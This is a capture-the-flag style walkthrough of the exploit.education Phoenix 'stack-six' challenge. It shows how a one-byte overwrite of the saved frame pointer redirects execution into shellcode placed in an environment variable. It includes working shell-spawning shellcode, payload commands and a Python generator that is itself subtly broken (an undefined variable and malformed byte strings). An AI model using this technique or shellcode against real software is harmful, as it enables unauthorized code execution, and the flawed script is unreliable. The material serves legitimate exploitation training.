# Source code

```C
#include<err.h>
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>

#define BANNER \
  "Welcome to /phoenix/amd64/stack-six, brought to you by https://exploit.education"

char * what = "Welcome, I am pleased to meet you ";

char *greet(char *who) {
  char buffer[128];
  int maxSize;
  //guessing the stack looks like
  //buffer  | e5c0
  //shit (12 bytes)
  //maxSize | e64c
  //shit (20 bytes)
  //old rbp  | e660
  //ret addr | e668

  maxSize = strlen(who);
  if (maxSize > (sizeof(buffer) - /* ensure null termination */ 1)) {
    maxSize = sizeof(buffer) - 1;
  }

  strcpy(buffer, what);
  strncpy(buffer + strlen(buffer), who, maxSize);
  return strdup(buffer);
}

int main(int argc, char **argv) {
  char *ptr;
  printf("%s\n", BANNER);

  ptr = getenv("ExploitEducation");
  if (NULL == ptr) {
    // This style of comparison prevents issues where you may accidentally
    // type if(ptr = NULL) {}..

    errx(1, "Please specify an environment variable called ExploitEducation");
  }
  char * greetstr = greet(ptr);
  printf("%s\n", greetstr);
  return 0;
}
```

# Walkthrough

This one went over my head, so went to Elshinbary's blog to understand the
solution. I understood enough that I could overwrite with 34 bytes, since
we are allowed to always copy 127 bytes and a null terminator into buffer+34, but
buffer is only 128 bytes long.


> N. B.: Elshinbary does not account for the added values on top of the stack,
nor the pushing of `rbx` right after setting up the stack frame. In my
explanation below, this is all accounted for.

Let's start by making sure that what is stored at `rbp_greet` is in fac
clobbered. To this end, we set

```
$ export ExploitEducation=$(perl -e 'print "A"x127')
```

Then when running `strncpy(buffer + strlen(buffer), who, maxSize);` we copy

```
AA...A (127 bytes)
```

to `buffer+34`. In other words, `buffer` will point to the string

```
Welcome, I am pleased to meet you AA...A (34+127=161 bytes)
```

Note that `strncpy` does not copy a null-terminator if there is no null-terminator
in the 127 bytes that are copied (this is the case for us). (If the length of
what is copied is less than 127, then we copy a null-terminator.)

Let's look at the stack frame for `greet` before the call to `strncpy`.

```
.           |
.           |
.           |
stack frame |
of          |
main        |
.           |
.           |
.           |
ret in main |
rbp_main    | rsp_1         // rbp = rsp_1
rbx         | rsp_2
.           |
.           |
.           |
\x00        |
buffer[33]  |
.           |           
.           |
.           |
buffer[1]   |
buffer[0]   |               //from here to rsp_2 (exclusive): 152 bytes
char *      |
char *      | rsp_3         //rsp_3 = rsp_2-0xa8
```

And after the call to `strncpy`

```
.                 |
.                 |
.                 |
stack frame       |
of                |
main              |
.                 |
.                 |
.                 |
ret in main       |
Arbp_main[1:7]    | rbp
AAAAAAAA          | rbp-0x8 until rbp-0x1
.                 |
.                 |
.                 |
A                 |
buffer[33]        |
.                 |           
.                 |
.                 |
buffer[1]         |
buffer[0]         |               //from here to rsp_2 (exclusive): 152 bytes
char *            |
char *            | rsp_3         //rsp_3 = rsp_2-0xa8
```

At the end of `greet` we will run `add rsp,0xa8; pop rbx; pop rbp; ret` so
we end up with the registers containing

```
rbx : AAAAAAAA
rbp : Arbp_main[1:7]
```

and then we return to `ret in main`. At the end of main, we will run `leave`
which is equivalent to `mov rsp,rbp; pop rbp`, so we get

```
rsp: Arbp_main[1:7]+0x8
rbp: *(Arbp_main[1:7])
```

then when `ret` is run, we execute the code at
`*(little_endian(Arbp_main[1:7])+0x8))`.
So we want to make sure that `*(little_endian(Arbp_main[1:7])+0x8)` corresponds
to an address in the environment variable string.

Ok, let's figure out the environment variable is stored. For this, we just look
at the registers when we enter `greet`. Thankfully, we have `GEF`, so this is
E Z. We find that the environment variable is stored at

```
00 00 7f ff ff ff ef 0c
```

Ok, so we want `*rsp` to equal this address (or something adjacent). We have
that `rsp` can be anything from

```
0x007fffffffeb00
```

to

```
0x007fffffffebff
```

So let's see if we have `0x7fffffffef0c` somewhere around there. As luck would
have it, we find `0x7fffffffef0c` at `0x7fffffffebe8`. So we want to modify
`rbp_main` to be `\xe0 rbp_main[1:7]`.

Let's first check that this works! We set

```
$ export ExploitEducation=$(perl -e 'print "\xe0"x127')
```

and indeed, before the `ret` in `main` we see that `rsp` becomes

```
0x7fffffffebe8
```

and at that place, we have the address `0x7fffffffef0c` which is where the
execution will start. Currently `0x7f...ffef0c` only contains `0xe0e0e0...`
which isn't code, but let's get going with shellcode right now.

## Developing the payload

Ok, we want to make sure that we the e. v. is on the form

```
nop_sled + shellcode + nop_align + b'\xe0'*N
```

such that `nop_sled+shellcode+nop_align` is small enough to not be part of
what overflows. I think only the last byte is required to be `b\xe0`. We verify
with

```
$ export ExploitEducation=$(perl -e 'print "A"x126,"\xe0"')
```

We step back to `<main+92> ret` and indeed, `rsp` is equal to `0x7fffffffebe8`.
So the top of the stack contains `0x7fffffffef0c`, which is the address of
e. v. -- we're good to go.


We generate the shellcode with Python again. In fact, we can use almost the same
shellcode as in stack five. The only difference is that we need to remove all
null bytes, since we put the shellcode in an e. v.. But this can be accomplished
by just changing `mov rax,0x3b` to `xor rax,rax; mov al,0x3b`.

```python
import struct
import sys
totlen=126
snopsz=int(input('start nop sled sz? '))
start_nop=b'\x90'*snopsz
shellcode=b'\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68
            \x48\xc1\xeb\x08
            \x53
            \x48\x89\xe7
            \x48\x31\xd2
            \x48\x31\xf6
            \x48\x31\xc0
            \xb0\x3b
            \x0f\x05'
if len(payload)+len(start_nop)>=126:
  raise RuntimeError("invalid snopsz")
end_nop='b\x90'*(126-len(payload)-len(start_nop))
sys.stdout.buffer.write(start_nop+shellcode+end_nop+b'\xe0')
```
This works in `gdb`, but not outside. What is weird is that I got the following
to work outside `gdb`

```
start_nop=b'\x90'*200
sys.stdout.buffer.write(start_nop+shellcode)
```

This is obviously a sheer coincidence. There is no reason
```
little_endian('b\x90'+rbp_main[1:7])+0x8
```
should point to memory that contains the address of a `nop` in the e. v.

However, since I am pressed for time. I will leave this for now.

## Addendum

To find the actual address we can use a payload on the form

```
b'\xcc'*126+bytes([ix])
```

and vary `ix` from `0x0` to `0xff` until we get a SIGTRAP. We should have also
created a `.gdbinit` file with

```
unset env LINES
unset env COLUMNS
set env _ /opt/phoenix/amd64/stack-six
```

as suggested by Elshinbary. Well, you live and learn, I suppose.
